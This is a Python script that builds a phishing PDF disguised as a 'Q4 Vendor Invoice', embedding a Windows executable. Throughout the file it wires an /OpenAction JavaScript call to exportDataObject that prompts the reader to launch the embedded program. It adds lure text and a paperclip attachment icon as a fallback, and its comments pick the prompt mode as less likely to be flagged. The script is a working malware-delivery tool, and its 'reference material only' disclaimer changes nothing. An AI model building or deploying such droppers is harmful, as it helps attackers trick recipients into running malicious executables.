#!/usr/bin/env python3
"""
build_pdf_payload.py

Generates a PDF that:
  - embeds a Windows executable
  - fires an /OpenAction JavaScript entry on open
  - calls exportDataObject(nLaunch=1) to prompt the user to open the file
  - shows a visible page-level attachment icon as a JS-disabled fallback

Usage:
    python3 build_pdf_payload.py --exe payload.exe --out Q4_Invoice.pdf \
        --name "Q4_Invoice_Update.exe"

Reference material only. See repo README and BUILD.md.
"""

import argparse
import zlib


def build_pdf(exe_path: str, exe_name: str, out_path: str) -> None:
    with open(exe_path, "rb") as f:
        exe_bytes = f.read()

    # FlateDecode compresses the embedded stream. PDF readers handle this
    # transparently.
    compressed_exe = zlib.compress(exe_bytes)

    # ── Visible page content ───────────────────────────────────────────────
    page_content = b"""BT
/F1 12 Tf
72 720 Td
(Q4 Vendor Invoice - Summary View) Tj
0 -20 Td
/F1 10 Tf
(Full invoice is attached as an embedded file.) Tj
0 -14 Td
(Click the attachment icon on the left to open.) Tj
0 -40 Td
/F1 9 Tf
(If the attachment icon is not visible, use File > Attachments.) Tj
ET"""

    # ── OpenAction JavaScript ──────────────────────────────────────────────
    # nLaunch: 1 = prompt user (safer, less likely to be flagged).
    # nLaunch: 2 = silent launch (blocked by hardened Reader installs).
    js = (
        "app.alert('Loading invoice viewer...', 3);"
        f"this.exportDataObject({{cName: '{exe_name}', nLaunch: 1}});"
    ).encode("utf-8")

    # ── PDF objects ────────────────────────────────────────────────────────
    objects = []

    # 1: Catalog (root) — wires OpenAction and the EmbeddedFiles name tree
    objects.append(
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R "
        b"/Names << /EmbeddedFiles << /Names [(" + exe_name.encode() + b") 6 0 R] >> >> >>"
    )

    # 2: Pages
    objects.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

    # 3: Page
    objects.append(
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        b"/Resources << /Font << /F1 8 0 R >> >> /Contents 4 0 R /Annots [9 0 R] >>"
    )

    # 4: Page content stream
    objects.append(
        b"<< /Length " + str(len(page_content)).encode() + b" >>\nstream\n"
        + page_content + b"\nendstream"
    )

    # 5: OpenAction — JavaScript dictionary
    objects.append(
        b"<< /S /JavaScript /JS ("
        + js.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")
        + b") >>"
    )

    # 6: Filespec
    objects.append(
        b"<< /Type /Filespec /F (" + exe_name.encode() + b") "
        b"/UF (" + exe_name.encode() + b") /EF << /F 7 0 R >> >>"
    )

    # 7: EmbeddedFile stream
    objects.append(
        b"<< /Type /EmbeddedFile /Subtype /application#2Foctet-stream "
        b"/Length " + str(len(compressed_exe)).encode() + b" "
        b"/Filter /FlateDecode "
        b"/Params << /Size " + str(len(exe_bytes)).encode() + b" >> >>\n"
        b"stream\n" + compressed_exe + b"\nendstream"
    )

    # 8: Font
    objects.append(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")

    # 9: Page annotation — visible paperclip icon
    objects.append(
        b"<< /Type /Annot /Subtype /FileAttachment /Rect [72 640 92 660] "
        b"/FS 6 0 R /Name /Paperclip "
        b"/Contents (Click to view invoice details) /F 0 >>"
    )

    # ── Serialize ──────────────────────────────────────────────────────────
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")

    xref_offsets = [0]
    for i, obj in enumerate(objects, start=1):
        xref_offsets.append(len(out))
        out += str(i).encode() + b" 0 obj\n" + obj + b"\nendobj\n"

    xref_start = len(out)
    out += b"xref\n0 " + str(len(objects) + 1).encode() + b"\n0000000000 65535 f \n"
    for off in xref_offsets[1:]:
        out += f"{off:010d} 00000 n \n".encode()

    out += (
        b"trailer\n<< /Size " + str(len(objects) + 1).encode() + b" /Root 1 0 R >>\n"
        b"startxref\n" + str(xref_start).encode() + b"\n%%EOF\n"
    )

    with open(out_path, "wb") as f:
        f.write(out)

    print(f"[+] Wrote {out_path} ({len(out)} bytes, embedded {len(exe_bytes)} byte exe)")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--exe",  required=True, help="Path to the exe to embed")
    ap.add_argument("--out",  required=True, help="Output PDF path")
    ap.add_argument("--name", default="Q4_Invoice_Update.exe",
                    help="Filename shown inside the PDF attachment prompt")
    args = ap.parse_args()
    build_pdf(args.exe, args.name, args.out)


if __name__ == "__main__":
    main()
